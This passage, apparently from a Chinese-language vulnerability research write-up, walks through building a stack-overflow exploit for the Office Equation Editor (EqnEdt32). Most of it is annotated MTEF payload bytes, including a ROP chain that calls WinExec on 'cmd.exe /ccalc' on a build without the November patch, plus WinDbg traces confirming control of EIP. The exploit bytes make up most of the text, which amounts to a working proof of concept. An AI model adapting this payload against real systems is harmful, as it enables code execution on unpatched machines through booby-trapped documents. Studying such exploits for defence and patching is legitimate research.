现在，把checkpoint截图中的数据全部抄过来后，我构造的数据如下(图18)：由前面的图3可以看到checkpoint提供的两个长度，在拷贝完后分别会拷贝8个字节和20个字节，也即第一次调用sub_443F6c会覆盖v6(含)到v8(不含)的0x8个字节，第二次调用sub_443F6c会覆盖vac_C(含)到ret_addr(含)的0x14个字节。从而成功覆盖返回地址，获取控制流。
图18
    03 01 01 03 0A // MTEF头部
    0A // 初始SIZE
    09 // tag
    64 // 0n100
    22 // lsize
    1c // dsize-high-byte
    4c // dsize-low-byte
    44 // 确保进入case 4
    66 // 填充用，随意
    77 // 填充用，随意
    09 // 填充用，随意
    05 // 填充用，随意
    AA // 填充用，随意
    55 // 确保进入第2个case 4
    10 // sub_443e34内读入的第1个字节
    11 // sub_443e34内读入的第2个字节
    12 // sub_443e34内读入的第3个字节
    1c // 等待计算以决定拷贝大小的长度1
    4c // 等待计算以决定拷贝大小的长度2
    63 6d 64 2e 65 78 65 20 // 第一次拷贝的8个字节
    2f 63 63 61 6c 63 00 44 44 44 44 44 ef be ad de ef be ad de // 第二次拷贝的20个字节
    0:000> p
    eax=001f15f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0
    eip=00443efc esp=0012f480 ebp=deadbeef iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    EqnEdt32!MFEnumFunc+0x156ff:
    00443efc c3              ret
    0:000> t
    eax=001f15f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0
    eip=deadbeef esp=0012f484 ebp=deadbeef iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    deadbeef ??              ???
    0:000> db eax
    001f15f2  30 4f 45 00 7a 16 1f 00-00 00 00 00 00 00 00 00  0OE.z...........
    001f1602  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    001f1612  00 00 00 00 00 00 00 00-96 fe 00 00 44 0b aa 14  ............D...
    001f1622  1f 00 63 6d 64 2e 65 78-65 20 2f 63 63 61 6c 63  ..cmd.exe /ccalc
    001f1632  00 44 44 44 44 44 e4 14-1f 00 10 01 3a 00 20 5a  .DDDDD......:. Z
    001f1642  45 00 7a 16 1f 00 00 00-00 00 00 00 00 00 00 00  E.z.............
    001f1652  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    001f1662  00 00 00 00 00 00 00 00-00 00 44 00 00 00 00 00  ..........D.....
同时，与checkpoint的文章中描述的一致,
此时的eax指向命令行参数的前第0x32个字节处。不出所料，此时的eip被覆盖为0xdeadbeef，正如checkpoint文章中所示的那样。
到这里就简单了，我们需要用到rop，checkpoint已经在他们的文章中给出rop的生成方法了，我直接用了他们的，主要意图就是是确保栈溢出后栈上的布局如下：
在没有开启aslr的eqnedt32版本上尝试，此时的base固定为0x400000，用Python脚本生成相应的rop语句。根据溢出长度此时第一次拷贝长度为8，第二次拷贝长度为40个字节，所以之前的控制长度的字节需要从1c
4c调整为1c 9c((2 * 0x9c + 9) >> 3 = 0x28)
现在，在不打11月补丁的版本上，我构造的全部数据如下：
    03 01 01 03 0A // MTEF头部
    0A // 初始SIZE
    09 // tag
    64 // 0n100
    22 // lsize
    1c // dsize-high-byte
    4c // dsize-low-byte
    44 // 确保进入case 4
    66 // 填充用，随意
    77 // 填充用，随意
    09 // 填充用，随意
    05 // 填充用，随意
    AA // 填充用，随意
    55 // 确保进入第2个case 4
    10 // sub_443e34内读入的第1个字节
    11 // sub_443e34内读入的第2个字节
    12 // sub_443e34内读入的第3个字节
    1c // 等待计算以决定拷贝大小的长度1
    4c // 等待计算以决定拷贝大小的长度2
    63 6d 64 2e 65 78 65 20 // 第一次拷贝的8个字节
    2f 63 63 61 6c 63 00 44 44 44 44 44
    19 00 00 00 // ebp
    3a c7 44 00 // ret_addr: add esp, 4; ret
    28 5b 45 00 // a read_write addr
    b6 0e 41 00 // add eax, ebp; ret 2
    b6 0e 41 00 // add eax, ebp; ret 2
    00 00       // pad for adjust stack by 2 bytes
    4b ed 40 00 // push eax; call sub_30C00(which call WinExec)
    00 00       // pad for align by 4 bytes
将构造好的数据替换原来的数据，调试运行，却发现公式编辑器直接退出了，仔细排查后发现是ret前的sub_437c9d函数中调用sub_43a78f导致的(图19)，应该是case语句没有取到合适的值，导致虚函数调用失败，从而导致进程退出。
图19
由于这两个函数我前面都分析过(图8和图17)，所以这里直接让下一个字节等于0就行，这样就会直接break，不会继续去解析tag。
最终，在不打11月补丁的版本上，我构造的全部数据如下：
    03 01 01 03 0A // MTEF头部
    0A // 初始SIZE
    09 // tag
    64 // 0n100
    22 // lsize
    1c // dsize-high-byte
    4c // dsize-low-byte
    44 // 确保进入case 4
    66 // 填充用，随意
    77 // 填充用，随意
    09 // 填充用，随意
    05 // 填充用，随意
    AA // 填充用，随意
    55 // 确保进入第2个case 4
    10 // sub_443e34内读入的第1个字节
    11 // sub_443e34内读入的第2个字节
    12 // sub_443e34内读入的第3个字节
    1c // 等待计算以决定拷贝大小的长度1
    4c // 等待计算以决定拷贝大小的长度2
    63 6d 64 2e 65 78 65 20 // 第一次拷贝的8个字节
    2f 63 63 61 6c 63 00 44 44 44 44 44
    19 00 00 00 // ebp
    3a c7 44 00 // ret_addr: add esp, 4; ret
    28 5b 45 00 // a read_write addr
    b6 0e 41 00 // add eax, ebp; ret 2
    b6 0e 41 00 // add eax, ebp; ret 2
    00 00       // pad for adjust stack by 2 bytes
    4b ed 40 00 // push eax; call sub_30C00(which call WinExec)
    00 00       // pad for align by 4 bytes
    00 00 00 00 // 保证执行流顺利到达ret(我这里加了4个00，加1个即可)
    0:000> bp 443e34
    0:000> g
    ...
    Sat Jan 13 21:14:17.616 2018 (GMT+8): Breakpoint 0 hit
    eax=00454f30 ebx=00000006 ecx=0012f4ac edx=00000002 esi=0012f7e4 edi=0012f5e0
    eip=00443e34 esp=0012f480 ebp=0012f4b4 iopl=0         nv up ei ng nz ac pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
    EqnEdt32!MFEnumFunc+0x15637:
    00443e34 55              push    ebp
    ...
    0:000> g
    Sat Jan 13 21:14:30.970 2018 (GMT+8): Breakpoint 1 hit
    eax=002615f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0
    eip=00443efc esp=0012f480 ebp=00000019 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    EqnEdt32!MFEnumFunc+0x156ff:
    00443efc c3              ret
    0:000> t
    eax=002615f2 ebx=00000006 ecx=7747a24c edx=00000002 esi=0012f7e4 edi=0012f5e0
    eip=0044c73a esp=0012f484 ebp=00000019 iopl=0         nv up ei pl nz ac po nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
    EqnEdt32!FltToolbarWinProc+0x25d3:
    0044c73a 83c404          add     esp,4
    0:000> t